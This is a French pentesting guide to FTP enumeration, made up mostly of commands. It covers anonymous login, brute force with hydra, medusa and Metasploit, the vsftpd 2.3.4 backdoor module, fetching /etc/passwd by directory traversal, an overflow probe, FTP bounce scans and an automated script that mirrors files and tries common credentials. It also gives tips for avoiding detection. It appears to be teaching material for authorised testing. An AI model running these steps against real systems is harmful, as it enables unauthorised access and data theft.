# FTP Enumeration

## 📁 Vue d'ensemble

FTP (File Transfer Protocol) est un protocole pour **transférer des fichiers** entre ordinateurs. Souvent mal configuré, il peut révéler des **informations sensibles** ou permettre un **accès non autorisé**.

> **💡 Explication Simple** : FTP c'est comme un service de livraison de fichiers. Si les livreurs ne vérifient pas l'identité, n'importe qui peut récupérer les colis !

**Ports FTP :**
- **Port 21** : Contrôle (commandes)
- **Port 20** : Données (transfert de fichiers)

## ⚠️ **IMPORTANT - À propos des exemples**

> **🎯 TOUS les IPs, usernames, passwords dans ce guide sont FICTIFS !**

**Dans le guide (EXEMPLE FICTIF) :**
```
target.com / 192.168.1.100
admin, ftp, anonymous
password123, admin
```

**Dans la vraie vie, vous devez adapter :**
```
votre-vraie-cible.com / 10.0.2.15
[vrais usernames trouvés]
[mots de passe réels]
```

## 🎯 Objectifs de l'Énumération FTP

1. **Identifier la version FTP** - vsftpd, ProFTPD, FileZilla Server
2. **Tester l'accès anonyme** - anonymous:anonymous
3. **Énumérer les utilisateurs** - Comptes FTP valides
4. **Explorer les répertoires** - Fichiers accessibles
5. **Détecter les vulnérabilités** - CVE selon version

## 🔍 Phase 1 : Reconnaissance FTP

### Banner Grabbing
```bash
# 1. Netcat pour banner
nc target.com 21

# 2. Nmap service detection
nmap -sV -p 21 target.com

# 3. Telnet
telnet target.com 21

# 4. Scripts Nmap FTP
nmap --script ftp-* target.com -p 21
```

### Informations dans le Banner
```bash
220 (vsFTPd 3.0.3)
220 ProFTPD 1.3.5 Server ready
220 Microsoft FTP Service
220-FileZilla Server 0.9.60 beta

# Rechercher :
# - Type de serveur FTP
# - Version exacte
# - OS sous-jacent (parfois)
```

## 🚪 Phase 2 : Test d'Accès Anonyme

### Connexion Anonyme
```bash
# 1. FTP client standard
ftp target.com
# Username: anonymous
# Password: anonymous (ou email@domain.com)

# 2. Test automatique avec Nmap
nmap --script ftp-anon target.com -p 21

# 3. Avec Metasploit
msfconsole
use auxiliary/scanner/ftp/anonymous
set RHOSTS target.com
run
```

### Exploration si Accès Anonyme Réussi
```bash
# Une fois connecté via FTP anonyme :
ftp> pwd                    # Répertoire actuel
ftp> ls -la                 # Liste détaillée
ftp> cd ..                  # Remonter d'un niveau
ftp> ls                     # Explorer
ftp> get filename           # Télécharger fichier
ftp> mget *.txt            # Télécharger tous les .txt
ftp> binary                # Mode binaire pour exécutables
ftp> ascii                 # Mode texte pour documents

# Test des permissions
ftp> mkdir test            # Créer dossier
ftp> put /tmp/test.txt     # Upload fichier
ftp> dele test.txt         # Supprimer fichier
```

## 👥 Phase 3 : Énumération des Utilisateurs

### Brute Force FTP
```bash
# 1. Hydra - Outil principal
hydra -L users.txt -P passwords.txt target.com ftp

# 2. Avec utilisateur connu
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com ftp

# 3. Métasploit
msfconsole
use auxiliary/scanner/ftp/ftp_login
set RHOSTS target.com
set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt
set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
run

# 4. Medusa (alternative)
medusa -h target.com -U users.txt -P passwords.txt -M ftp
```

### Utilisateurs Communs à Tester
```bash
# Comptes par défaut
admin, administrator, root, ftp, ftpuser

# Comptes de service  
backup, web, www, apache, nginx

# Comptes génériques
user, guest, test, demo

# Wordlists recommandées
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/wordlists/metasploit/unix_users.txt
```

## 🔐 Phase 4 : Analyse des Vulnérabilités

### Vulnérabilités par Version
```bash
# 1. vsftpd 2.3.4 - Backdoor
use exploit/unix/ftp/vsftpd_234_backdoor

# 2. ProFTPD vulnérabilités
# Recherche par version
searchsploit ProFTPD 1.3.5

# 3. Scripts Nmap pour vulns
nmap --script ftp-vuln-cve2010-4221 target.com -p 21
```

### Tests de Sécurité Spécifiques
```bash
# 1. Directory traversal
ftp> cd ../../../etc
ftp> get passwd

# 2. PASV mode issues
ftp> passive        # Activer mode passif
ftp> ls            # Tester comportement

# 3. Buffer overflow tests (avec prudence)
# Connexion avec username très long
python -c "print 'A' * 1000" | nc target.com 21
```

## 📂 Phase 5 : Exploration de Contenu

### Recherche de Fichiers Sensibles
```bash
# 1. Une fois connecté FTP
ftp> ls -la
ftp> find . -name "*.txt" -type f    # Si supporté
ftp> find . -name "password*"

# 2. Patterns de fichiers à chercher
*.txt, *.doc, *.pdf, *.xls          # Documents
*.sql, *.db, *.backup               # Bases de données
*.config, *.conf, *.ini             # Configuration
*.log                               # Logs
*.key, *.pem, *.cert               # Certificats/clés

# 3. Téléchargement systématique
#!/bin/bash
# Script pour download automatique
lftp -c "mirror --verbose ftp://anonymous@target.com/ ./ftp_dump/"
```

### Analyse du Contenu Téléchargé
```bash
# 1. Recherche dans les fichiers
grep -r "password" ftp_dump/
grep -r "admin" ftp_dump/
grep -r -i "credential" ftp_dump/

# 2. Recherche de patterns sensibles
grep -r -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}" ftp_dump/    # IPs
grep -r -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" ftp_dump/   # Emails

# 3. Analyse des métadonnées
exiftool ftp_dump/*.pdf
exiftool ftp_dump/*.doc
strings ftp_dump/binary_files
```

## 🛠️ Phase 6 : Outils Automatisés

### Scripts Nmap FTP
```bash
# 1. Script complet FTP
nmap --script ftp-* target.com -p 21

# 2. Scripts spécifiques
nmap --script ftp-anon target.com -p 21              # Accès anonyme
nmap --script ftp-bounce target.com -p 21            # FTP bounce
nmap --script ftp-brute target.com -p 21             # Brute force
nmap --script ftp-libopie target.com -p 21           # Vuln libopie
nmap --script ftp-proftpd-backdoor target.com -p 21  # ProFTPD backdoor
nmap --script ftp-syst target.com -p 21              # Commande SYST
nmap --script ftp-vsftpd-backdoor target.com -p 21   # vsftpd backdoor
```

### lftp pour Exploration Avancée
```bash
# 1. Connexion avec lftp
lftp target.com

# 2. Commandes utiles lftp
lftp target.com:~> login anonymous ""
lftp target.com:~> ls -la
lftp target.com:~> find . -name "*.txt"
lftp target.com:~> mirror --verbose / ./ftp_complete_dump/
lftp target.com:~> lcd /local/directory
lftp target.com:~> get -c filename    # Resume download

# 3. Script lftp automatisé
lftp -c "open ftp://anonymous@target.com; mirror --verbose; quit"
```

## 🔒 Phase 7 : Tests de Sécurité Avancés

### FTP Bounce Attack
```bash
# 1. Test manuel
ftp target.com
ftp> PORT 192,168,1,200,0,22    # Scan port 22 sur 192.168.1.200
ftp> LIST

# 2. Avec Nmap
nmap -b anonymous:password@target.com 192.168.1.200 -p 22

# 3. Script automatisé
#!/bin/bash
for port in 22 23 25 53 80 443; do
    echo "Testing port $port"
    echo "PORT 192,168,1,200,0,$port" | nc target.com 21
done
```

### SSL/TLS Testing (FTPS)
```bash
# 1. Test SSL explicite
openssl s_client -connect target.com:21 -starttls ftp

# 2. Test SSL implicite (port 990)
openssl s_client -connect target.com:990

# 3. Scripts Nmap SSL
nmap --script ssl-* target.com -p 21,990
```

## 📋 Checklist FTP Enumeration

### ✅ Tests Essentiels :
1. **Banner Grabbing** - Version et type de serveur
2. **Anonymous Access** - Test anonymous:anonymous
3. **Directory Listing** - Exploration des fichiers
4. **File Download** - Récupération de contenu sensible
5. **Brute Force** - Si accès anonyme refusé
6. **Vulnerability Check** - CVE selon version

### ✅ Vulnérabilités Communes :
- **Anonymous Access** → Information disclosure
- **Weak Credentials** → Unauthorized access
- **Directory Traversal** → System file access
- **FTP Bounce** → Port scanning via FTP
- **Buffer Overflow** → Remote code execution
- **Backdoors** → vsftpd 2.3.4, ProFTPD mods

## 🛠️ Script d'Énumération FTP Automatisé

```bash
#!/bin/bash
# FTP Enumeration Script

TARGET=$1
if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[+] Starting FTP enumeration for $TARGET"
mkdir ${TARGET}_ftp_enum

# 1. Banner grabbing
echo "[+] Getting FTP banner..."
timeout 5 nc $TARGET 21 > ${TARGET}_ftp_enum/banner.txt 2>&1

# 2. Nmap FTP scripts
echo "[+] Running Nmap FTP scripts..."
nmap --script ftp-* $TARGET -p 21 > ${TARGET}_ftp_enum/nmap_ftp.txt

# 3. Anonymous access test
echo "[+] Testing anonymous access..."
lftp -c "open ftp://$TARGET; user anonymous ''; ls -la; quit" > ${TARGET}_ftp_enum/anonymous_test.txt 2>&1

# 4. If anonymous access works, mirror content
if grep -q "drw" ${TARGET}_ftp_enum/anonymous_test.txt; then
    echo "[+] Anonymous access successful! Downloading content..."
    mkdir ${TARGET}_ftp_enum/ftp_content
    lftp -c "open ftp://$TARGET; user anonymous ''; mirror --verbose . ${TARGET}_ftp_enum/ftp_content/; quit"
fi

# 5. Brute force common credentials
echo "[+] Testing common credentials..."
echo "admin:admin
ftp:ftp
administrator:password
user:password" > ${TARGET}_ftp_enum/common_creds.txt

hydra -C ${TARGET}_ftp_enum/common_creds.txt $TARGET ftp > ${TARGET}_ftp_enum/hydra_results.txt 2>&1

echo "[+] FTP enumeration completed!"
echo "[+] Results saved in ${TARGET}_ftp_enum/"
```

## ⚠️ Considérations de Sécurité

### Détection
- FTP connexions sont loggées
- Brute force est facilement détectable
- Download de contenu peut déclencher alertes

### Légalité  
- Tester seulement sur ses propres systèmes
- Accès anonyme ≠ autorisation de download
- Respecter les politiques de l'organisation

### Discrétion
- Éviter download massif simultané
- Utiliser delays entre tentatives
- Monitorer les logs pour détection

---
*Cette section couvre l'énumération FTP complète. Pour l'exploitation des vulnérabilités FTP, voir la section 02-Exploitation/Réseaux/*

## Énumération FTP

## Objectif
Découvrir les accès anonymes, les fichiers sensibles, et les failles potentielles sur un serveur FTP.

---

## Commandes essentielles et explications

### 1. Connexion anonyme
```bash
ftp target.com
```
- **ftp** : Client FTP en ligne de commande.
- **Astuce débutant** : Quand il demande un login, essaye "anonymous" comme utilisateur et une adresse mail bidon comme mot de passe.
- **Exemple de sortie** :
```
Name (target.com:root): anonymous
Password: test@test.com
230 Login successful.
ftp> ls
```
- **À surveiller** : Accès autorisé sans mot de passe, fichiers listés.

### 2. Listing des fichiers et téléchargement
```bash
ls
get fichier.txt
```
- **ls** : Liste les fichiers et dossiers.
- **get** : Télécharge un fichier.
- **Astuce** : Chercher des fichiers de config, des backups, des scripts.

### 3. Enumération automatisée avec Nmap
```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst target.com
```
- **ftp-anon** : Teste l'accès anonyme.
- **ftp-bounce** : Vérifie si le serveur peut être utilisé pour rebondir sur d'autres machines.
- **ftp-syst** : Récupère des infos sur le système FTP.
- **Exemple de sortie** :
```
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: FTP server status:
|   Connected to 192.168.1.10
|   TYPE: ASCII
```
- **À surveiller** : Accès anonyme, possibilité de rebond, infos système révélées.

---

## Conseils pour débutants
- Toujours tester l'accès "anonymous" avant d'essayer des credentials.
- Chercher des fichiers cachés ou oubliés (backups, .htaccess, scripts).
- Utiliser Nmap pour automatiser la détection de failles FTP.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - FTP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/FTP%20Methodology)
- [Nmap FTP NSE Scripts](https://nmap.org/nsedoc/categories/ftp.html)

## 🗂️ Workflow d'énumération FTP
1. Scan du port 21 (Nmap)
   ↓
2. Banner grabbing et détection de version (nc, nmap -sV, telnet)
   ↓
3. Test d'accès anonyme (ftp, nmap NSE, Metasploit)
   ↓
4. Enumération des utilisateurs (hydra, medusa, Metasploit)
   ↓
5. Exploration des répertoires et fichiers sensibles
   ↓
6. Recherche de vulnérabilités par version
   ↓
7. Extraction et analyse des fichiers téléchargés

## 🛡️ Conseils OPSEC
- Ne pas abuser des tentatives de connexion pour éviter le bannissement.
- Privilégier les tests anonymes avant d'utiliser des credentials réels.
- Ne jamais uploader de fichier sans autorisation.
- Utiliser des délais entre les tentatives de brute force.

## ⚠️ Erreurs fréquentes
- Oublier de tester l'accès anonyme (souvent ouvert !)
- Ne pas vérifier les permissions d'écriture
- Lancer des scans trop agressifs qui déclenchent des alertes
- Négliger les fichiers cachés ou de backup

## 💡 Astuces
- Utiliser lftp pour automatiser le téléchargement de tout un répertoire
- Croiser les résultats de plusieurs outils (ftp, nmap, Metasploit)
- Tester les credentials trouvés sur d'autres services
- Scripter la recherche de fichiers sensibles (*.txt, *.config, *.sql)

## 🔗 Pour aller plus loin
- [PayloadsAllTheThings - FTP](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/FTP%20Methodology)
- [HackTricks - FTP](https://book.hacktricks.xyz/pentesting/pentesting-ftp)
- [SecLists - Wordlists FTP](https://github.com/danielmiessler/SecLists/tree/master/Usernames)
